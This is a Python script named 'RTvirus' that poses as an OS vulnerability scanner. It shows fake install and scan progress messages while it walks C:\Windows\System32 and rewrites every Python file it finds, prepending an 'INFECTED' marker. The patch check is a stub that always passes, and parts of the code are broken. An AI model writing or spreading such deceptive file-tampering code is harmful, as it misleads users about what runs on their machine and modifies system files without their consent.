import subprocess
import os
import time
import random

def check_os_vulnerabilities():
    os_name = get_os_name()
    if os_name == 'win32':
        vulnerable_patches = get_vulnerable_patches()
        if vulnerable_patches:
            print(f"Vulnerabilities found for patches: {', '.join(vulnerable_patches)}")
            print("Please update your system by installing the necessary patches.")
        else:
            print("No known vulnerabilities found for patches.")

def get_os_name():
    # Add logic to determine the operating system name
    return os.name

def get_vulnerable_patches():
    # Simulated function - replace with actual logic to check for missing patches
    patches = ['KB500135', 'KB500140', 'KB500144', 'KB500152', 'KB500160']
    return [patch for patch in patches if not is_patch_installed(patch)]

def is_patch_installed(patch):
    # Simulated function - replace with actual logic to check if the patch is installed
    return True  # Replace this with your implementation

def mark_infected_files(directory):
    infected_files = []
    for dirname, _, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith('.py'):
                file_path = os.path.join(dirname, filename)
                try:
                    with open(file_path, 'r') as file:
                        file_contents = file.read()

                    if "THIS FILE IS INFECTED" not in file_contents:
                        file_contents = "# THIS FILE IS INFECTED\n" + file_contents

                        with open(file_path, 'w') as file:
                            file.write(file_contents)

                        infected_files.append(file_path)
                        print(f"Infected: {file_path}")
                        time.sleep(3)
                    else:
                        print(f"Already infected: {file_path}")
                        time.sleep(3)
                except Exception as e:
                    print(f"Error processing file: {file_path} - {e}")
    # return infected_files

def cnt():
    cont=True
    val=str(input("\n\nDo you want to Continue?(y/n):"))
    if val=='y':
        cont=True
    elif val=='n':
        cont=False
    else:cont=True
    return cont




def run_sfc_scan():
    try:
        check_os_vulnerabilities()
        infected_files = mark_infected_files('C:\\Windows\\System32')  # Replace with the desired directory
        print("Infected files:", infected_files)
    except subprocess.CalledProcessError as e:
        print(f"Error during SFC scan: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
def run_sfc_scanfile():
    try:
        # Run the SFC scan command
        subprocess.run(['sfc', '/verifyonly'], check=True)
        print("\rScan completed successfully.",end="\r")
    except subprocess.CalledProcessError as e:
        print(f"Error during SFC scan: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    cntnu=True
    try:
        print("Installing",end="\r")
        time.sleep(3)
        print("Installed Successfully!")
        time.sleep(2)
        print("\n")
        print("WELCOME TO THE RTvirus!\n\t\t by- Rocking Team")
        while cntnu==True:
            print("OS Venerability Scan")
            print("Continuing Scan.",end="")
            time.sleep(1)
            print(".",end="")
            time.sleep(1)
            print(".",end="")
            # doo=int(input("\t:-"))
            # if doo==2:
            print("\nRTvirus",end=" ")
            directory_path = r'C:\Windows\System32'

            # List all files in the directory
            files = os.listdir(directory_path)
            for file_name in files:
                # time.sleep(1)
                print(f"SCANNING...\t{file_name}", end="\r")
                # time.sleep(1)
                print("|COMPLETED|\n", end="\r")
                # print("Scaning.",end="")
                # time.sleep(tme)

            print("\n.", end="")
            # time.sleep(1)
            print(".", end="")
            # time.sleep(1)
            print(".", end="\n")


            run_sfc_scan()
            cntnu=cnt()

    #         elif doo==1:
    #             try:
    #                 drc=str(input(""))
    #                 directory_path = f'{drc}'
    #
    #                 # List all files in the directory
    #                 files = os.listdir(directory_path)
    #                 tme = 10
    #
    #                 for file_name in files:
    #                     # time.sleep(1)
    #                     print(f"SCANNING...\t{file_name}", end="\r")
    #                     time.sleep(1)
    #                     print("|COMPLETED|\n", end="\r")
    #                     # print("Scaning.",end="")
    #                     tme = random.randint(1, 7)
    #                     time.sleep(tme)
    #
    #                 print("\n.",end="")
    #                 time.sleep(1)
    #                 print(".",end="")
    #                 time.sleep(1)
    #                 print(".",end="\n")
    #                 # time.sleep(1)
    #                 print("RTvirus didn't found any Violation.")
    #                 cntnu = cnt()
    #
    #             except:print("Wrong Input!")
    #         elif doo!=1 & doo!=2:
    #             cntnu = cnt()
    #             print("Exited",end="")
    #             time.sleep(1)
    #             print(".",end="")
    #             time.sleep(1)
    #             print(".",end="")
    #             time.sleep(2)
    #
    #             break
    #
    #
    except:print("Error Occurred!!")
    #
    #
